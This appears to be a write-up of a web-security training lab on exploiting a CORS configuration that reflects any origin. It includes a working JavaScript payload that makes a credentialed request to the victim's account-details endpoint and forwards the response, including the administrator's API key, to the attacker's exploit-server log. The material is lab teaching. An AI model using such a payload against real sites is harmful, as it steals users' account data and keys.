## Lab: CORS vulnerability with basic origin reflection

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: `wiener:peter`

### Lab 1 Exploitation

Starting with exploring our website we will login with the creds provided and see the requests after that, we will find that there is a request after signing in called `/accountDetails` and when seeing the response we will find that it gives back the information related to our account and also there is a header called `Access-Control-Allow-Credentials: true` which suggesting that it may support CORS.

_Request_

So to make sure if it supports CORS or not we will use the origin header and type any imaginary website to see if it will accepts it or not

and we will see that it is accepted in the response so let’s try to exploit it now via the exploit server

Put this script in the exploit server and send it to the victim, This script make a request via the victim browser to access his account details end point and as the “***Access-Control-Allow-Credentials: true”*** is there so we will get his account details easily because the request will be made with his credentials and we will receive our response via our log endpoint in the exploit server.

```
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

and we will find that the apikey is now with us decode it via burpsuite, submit it and the lab is solved
